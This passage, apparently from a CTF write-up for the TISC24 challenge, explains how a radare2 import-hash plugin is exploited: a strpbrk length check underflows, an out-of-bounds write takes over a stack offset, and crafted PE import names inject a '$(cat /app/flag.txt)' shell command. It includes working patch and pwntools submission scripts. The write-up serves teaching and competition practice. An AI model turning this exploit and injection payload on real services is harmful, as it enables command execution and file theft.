        local_10 = (undefined8 *)0x0;
      }
      else {
        local_10 = *(undefined8 **)(local_50 + 0x10);
      }
</code></pre>
<p>The <code>aa</code> command stands for analyze all. Its output seems to be discarded, but perhaps there are some side effects?</p>
<p>The <code>iij</code> command outputs information of imports by the binary, formatted as json. It looks something like this:</p>
<pre><code class="language-plaintext">[0x1400013f0]&gt; iij
[{"ordinal":1,"bind":"NONE","type":"FUNC","name":"DeleteCriticalSection","libname":"KERNEL32.dll","plt":5368742240},{"ordinal":2,"bind":"NONE","type":"FUNC","name":"EnterCriticalSection","libname":"KERNEL32.dll","plt":5368742248},{"ordinal":3,"bind":"NONE","type":"FUNC","name":"GetLastError","libname":"KERNEL32.dll","plt":5368742256},{"ordinal":4,"bind":"NONE","type":"FUNC","name":"InitializeCriticalSection","libname":"KERNEL32.dll","plt":5368742264},
... remainder omitted for brevity ...
</code></pre>
<p>The next section is a for loop:</p>
<pre><code class="language-c">      for (; local_10 != (undefined8 *)0x0; local_10 = (undefined8 *)*local_10) {
        local_60 = cJSON_GetObjectItemCaseSensitive(local_10,"libname");
        local_68 = cJSON_GetObjectItemCaseSensitive(local_10,"name");
        if ((local_60 != 0) &amp;&amp; (local_68 != 0)) {
          libname = *(char **)(local_60 + 0x20);
          funcname = *(char **)(local_68 + 0x20);
          local_80 = strpbrk(libname,".dll");
          if ((local_80 == (char *)0x0) || (local_80 == libname)) {
            bVar1 = false;
          }
          else {
            bVar1 = true;
          }
          if (!bVar1) {
            local_88 = strpbrk(libname,".ocx");
            if ((local_88 == (char *)0x0) || (local_88 == libname)) {
              bVar1 = false;
            }
            else {
              bVar1 = true;
            }
            if (!bVar1) {
              local_90 = strpbrk(libname,".sys");
              if ((local_90 == (char *)0x0) || (local_90 == libname)) {
                bVar1 = false;
              }
              else {
                bVar1 = true;
              }
              if (!bVar1) {
                puts("Invalid library name! Must end in .dll, .ocx or .sys!");
                return 1;
              }
            }
          }
          all_imports_len = strlen(libname);
          libname_len = (int)all_imports_len + -4;
          all_imports_len = strlen(funcname);
          funcname_len = (int)all_imports_len;
          if (0xffeU - (long)offset &lt; (ulong)(long)(funcname_len + libname_len)) {
            puts("Imports too long!");
            return 1;
          }
          for (i = 0; i &lt; libname_len; i = i + 1) {
            iVar3 = tolower((int)libname[i]);
            all_imports[i + offset] = (char)iVar3;
          }
          offset = (short)libname_len + offset;
          all_imports[(int)offset] = '.';
          offset = offset + 1;
          for (local_18 = 0; local_18 &lt; funcname_len; local_18 = local_18 + 1) {
            iVar3 = tolower((int)funcname[local_18]);
            all_imports[local_18 + offset] = (char)iVar3;
          }
          offset = (short)funcname_len + offset;
          all_imports[(int)offset] = ',';
          offset = offset + 1;
        }
      }
</code></pre>
<p>Because the output is a list of JSON objects, I assume that we're looping through the list. Based on the structure of the loop it seems that cJSON is returning the first JSON object as a struct, where the first field in the struct is a pointer to the next JSON object.</p>
<p>For each import, we check that the library name ends with .dll, .ocx or .sys. Then we concatenate <code>&lt;libname&gt;.&lt;name&gt;,</code> to a string of all the module imports.</p>
<pre><code class="language-c">      MD5_Init(&amp;hasher);
      all_imports_len = strlen(all_imports);
      MD5_Update(&amp;hasher,all_imports,all_imports_len - 1);
      MD5_Final(hash,&amp;hasher);
      local_58 = "0123456789abcdef";
      for (j = 0; j &lt; 0x10; j = j + 1) {
        command[j * 2 + 5] = "0123456789abcdef"[(int)((char)hash[j] &gt;&gt; 4) &amp; 0xf];
        command[(j + 3) * 2] = "0123456789abcdef"[(int)(char)hash[j] &amp; 0xf];
      }
      pvVar5 = (void *)r_core_cmd_str(local_28,command);
      free(pvVar5);
      uVar4 = 1;
</code></pre>
<p>The last section calculates the md5 hash of the <code>all_imports</code> string and converts it to a hex-encoded string. This string is then inserted into the 32-byte space in the <code>command</code> string, so we end up with something like <code>echo 135638396666dff5b69beff74a269469 &gt; out</code>. The out file is then read by the python server and its contents are sent back to the user.</p>
<h1 id="strpbrk-bug" tabindex="-1">strpbrk bug</h1>
<p>I did some experimentation with the strpbrk function and noticed some unexpected behavior: Running something like <code>strpbrk(".", ".dll")</code> returns the string <code>"."</code>. A quick google search shows that strpbrk "finds the first character in the string s1 that matches any character specified in s2". Since <code>libname_len = strlen(libname) - 4</code>, we can get <code>libname_len</code> to be a negative number.</p>
<p>I tried passing <code>"."</code> as the library name (how to control the PE library names will be discussed later), but this fails because of an additional check in the if statement shown below.</p>
<pre><code class="language-c">          local_80 = strpbrk(libname,".dll");
          if ((local_80 == (char *)0x0) || (local_80 == libname)) {
</code></pre>
<p>The output of strpbrk cannot be equal to libname. So we have to pass something like <code>"a."</code> instead. This will result in <code>libname_len = -2</code>, and <code>offset = -2</code>.</p>
<pre><code class="language-c">          offset = (short)libname_len + offset;
          all_imports[(int)offset] = '.';
          offset = offset + 1;
          for (local_18 = 0; local_18 &lt; funcname_len; local_18 = local_18 + 1) {
            iVar3 = tolower((int)funcname[local_18]);
            all_imports[local_18 + offset] = (char)iVar3;
          }
</code></pre>
<h1 id="array-oob-write" tabindex="-1">Array OOB write</h1>
<p>Then "." (value 0x2e) is written to <code>all_imports[-2]</code>. Conveniently, <code>offset</code> is a 2 byte value stored right before <code>all_imports</code>, so the LSB of <code>offset</code> is overwritten. Now <code>offset = 0xff2e = -210</code>, and our next write will be to <code>all_imports[-210]</code></p>
<p>Looking at the stack layout, there doesn't seem to be anything important in that memory region:</p>
<p><img src="/ctf-writeups/tisc24/imphash_stacklayout.png" alt=""></p>
<p>If write 208 more bytes then we should reach <code>offset</code> and overwrite the LSB with the next byte. So we have control of <code>offset</code> and thus can write to any arbitrary memory location in a 0x7fff byte radius around <code>all_imports</code>. The most obvious thing to overwrite seems to be the <code>command</code> string, since it basically gives us RCE.</p>
<p>Unfortunately, we can't overwrite the full <code>command</code> string due to a number of issues. Firstly, <code>command</code> is located 0x100 bytes below <code>all_imports</code>, so we need <code>offset = 0xff00</code> - but we can't write a null byte because the number of bytes written is dictated by <code>strlen</code>. Maybe it would be possible to write 0xff to the LSB followed by writing 0xfe to the MSB, but this also fails because of the next issue: At the end of the function a 32 byte hex string is written to <code>command[5:37]</code>, messing up whatever command we were planning to execute.</p>
<p>What if we put our code <em>after</em> the 32 byte region? I checked if it was possible to run a command in backticks or in <code>$()</code> in radare2:</p>
<pre><code class="language-plaintext">[0x1400013f0]&gt; echo aoeuaoeu$(cat flag.txt)
aoeuaoeutisc{fake_flag}
</code></pre>
<p>It works! Now we just need to make offset point to <code>command[37]</code>, so <code>offset = 0xff25</code>. Then we can write something like <code>$(cat flag.txt) &gt; out #</code> after that.</p>
<h1 id="controlling-pe-imports" tabindex="-1">Controlling PE imports</h1>
<p>I tried to find a way to craft a PE executable with the specific strings we need as module imports. I found the following resources:</p>
<ul>
<li><a href="https://maskray.me/blog/2023-12-03-linker-notes-on-pe-coff">https://maskray.me/blog/2023-12-03-linker-notes-on-pe-coff</a></li>
<li><a href="https://opensecuritytraining.info/LifeOfBinaries.html">https://opensecuritytraining.info/LifeOfBinaries.html</a></li>
<li><a href="https://www.youtube.com/watch?v=rbN53Xh21_g&amp;list=PLUFkSN0XLZ-n_Na6jwqopTt1Ki57vMIc3&amp;index=12">https://www.youtube.com/watch?v=rbN53Xh21_g&amp;list=PLUFkSN0XLZ-n_Na6jwqopTt1Ki57vMIc3&amp;index=12</a></li>
</ul>
<p>But in the end, I decided that it was too much trouble to try to comprehend the PE format and took the most braindead approach - replacing the module strings in an existing PE file with strings of the same length (or less).</p>
<p>I compiled an empty c program with mingw64 to produce the inital PE file: <code>x86_64-w64-mingw32-gcc main.c</code></p>
<pre class="named-fence-block"><code class="language-c">void main() {
}
</code><div class="named-fence-filename">main.c</div></pre>
<p>Care must be exercised when patching the PE, taking into account the maximum length of each import name (I actually ran into a lot of bugs because of this, perhaps I should have figured out how to make the entire payload in a single import string). Here are all the imports, in order:</p>
<pre><code class="language-plaintext">KERNEL32.dll.DeleteCriticalSection
KERNEL32.dll.EnterCriticalSection
KERNEL32.dll.GetLastError
KERNEL32.dll.InitializeCriticalSection
KERNEL32.dll.LeaveCriticalSection
KERNEL32.dll.SetUnhandledExceptionFilter
KERNEL32.dll.Sleep
KERNEL32.dll.TlsGetValue
KERNEL32.dll.VirtualProtect
KERNEL32.dll.VirtualQuery
msvcrt.dll.__C_specific_handler
msvcrt.dll.__getmainargs
msvcrt.dll.__initenv
msvcrt.dll.__iob_func
msvcrt.dll.__set_app_type
msvcrt.dll.__setusermatherr
msvcrt.dll._amsg_exit
msvcrt.dll._cexit
msvcrt.dll._commode
msvcrt.dll._fmode
msvcrt.dll._initterm
msvcrt.dll._onexit
msvcrt.dll.abort
msvcrt.dll.calloc
msvcrt.dll.exit
msvcrt.dll.fprintf
msvcrt.dll.free
msvcrt.dll.fwrite
msvcrt.dll.malloc
msvcrt.dll.memcpy
msvcrt.dll.signal
msvcrt.dll.strlen
msvcrt.dll.strncmp
msvcrt.dll.vfprintf
</code></pre>
<p>We replace <code>KERNEL32.dll</code> with <code>a.</code>. We also replace <code>msvcrt.dll</code> with <code>a.</code> for simplicity. The first part of the payload needs to be 208 bytes padding to reach <code>offset</code>'s memory address, so we leave the first bunch of strings as they are. I used a script to calculate when the 208 byte mark would be reached:</p>
<blockquote>
<p>I made a lot of dumb mistakes calculating this. Even now writing this, I just realised I forgot to account for 2 being subtracted from <code>offset</code> each time because of the libname integer underflow (I fixed it by debugging).</p>
</blockquote>
<pre class="named-fence-block"><code class="language-python">imports = [...]  # imports json data, omitted for brevity

total_len = 1
for x in imports:
    total_len += len(x['name'])
    if total_len &gt;= 208:
        print(x['libname'], x['name'])
        print('stop here!', total_len)
        break
</code><div class="named-fence-filename">h.py</div></pre>
<p>This outputs:</p>
<pre><code class="language-plaintext">msvcrt.dll __initenv
stop here! 210
</code></pre>
<p>Here's my final patch script (somewhat cleaned up):</p>
<pre class="named-fence-block"><code class="language-python">with open('a.exe', 'rb') as f:
    data = f.read()


def replace_single(bin, from_, to):
    # occurrences = bin.count(from_)
    # assert occurrences == 1, f'Ambiguous replace: {from_}. Found {occurrences}'
    assert len(from_) == len(
        to), 'Can only replace with string of the same length'
    return bin.replace(from_, to, 1)


i = 0x3894
size = len('KERNEL32.dll')
data = data[:i] + b'a.' + b'\x00'*(size-2) + data[i+size:]

data = replace_single(data, b'msvcrt.dll', b'a.\x00crt.dll')

data = replace_single(data, b'__initenv', b'__init\x00\x00\x00')
data = replace_single(data, b'__iob_func', b'A"' + b'\x00' * 8)
data = replace_single(data, b'__set_app_type', b'__s\x00t_app_type')

i = data.find(b'__setusermatherr')
payload = b'$(cat /app/flag.txt)&gt;out#AAAAAAA\x00'
data = data[:i] + payload + data[i+len(payload):]

to_remove = [
    # b'__C_specific_handler',
    # b'__getmainargs',
    # b'__initenv',
    # b'__iob_func',
    # b'__set_app_type',
    # b'__setusermatherr',
    # b'_amsg_exit',
    b'_cexit',
    b'_commode',
    b'_fmode',
    b'_initterm',
    b'_onexit',
    b'abort',
    b'calloc',
    b'exit',
    b'fprintf',
    b'free',
    b'fwrite',
    b'malloc',
    b'memcpy',
    b'signal',
    b'strlen',
    b'strncmp',
    b'vfprintf',
]
for str in to_remove:
    data = replace_single(data, str, b'\x00' + str[1:])

with open('a1.exe', 'wb') as f:
    f.write(data)
</code><div class="named-fence-filename">patch.py</div></pre>
<p>I then submitted this to the remote server using the script:</p>
<pre class="named-fence-block"><code class="language-python">from pwn import *
import base64

with open('a1.exe', 'rb') as f:
    data = f.read()
    payload = base64.b64encode(data)

t = remote('chals.tisc24.ctf.sg', 53719)
t.sendlineafter(b'Input PE file (base64 encoded): ', payload)
t.interactive()
</code><div class="named-fence-filename">s.py</div></pre>
<p>This printed the flag: <code>TISC{pwn1n6_w17h_w1nd0w5_p3}</code></p>
<h1 id="debugging-notes" tabindex="-1">Debugging notes</h1>
<p>I made a lot of mistakes and as such had to do a lot of debugging for this challenge.</p>
<p>To test my patched PE executable locally I could just run <code>gdb --args r2 -q -c imp -e bin.relocs.apply=true a.exe</code>. To do further debugging with gdb (e.g. to find out what command string was being generated), I used the following commands:</p>
<p><code>gdb --args r2 -q -c imp -e bin.relocs.apply=true a1.exe</code> to start gdb</p>
<p><code>catch load libcoreimp.so</code> to break when the shared library is loaded. After it's loaded I can set breakpoints and debug as usual.</p>
</div><div class="fixed w-[17.5rem] h-full top-0 right-0 pointer-events-none pr-8 max-lg:hidden"><!----></div></div></div></div>
    
  

</body></html>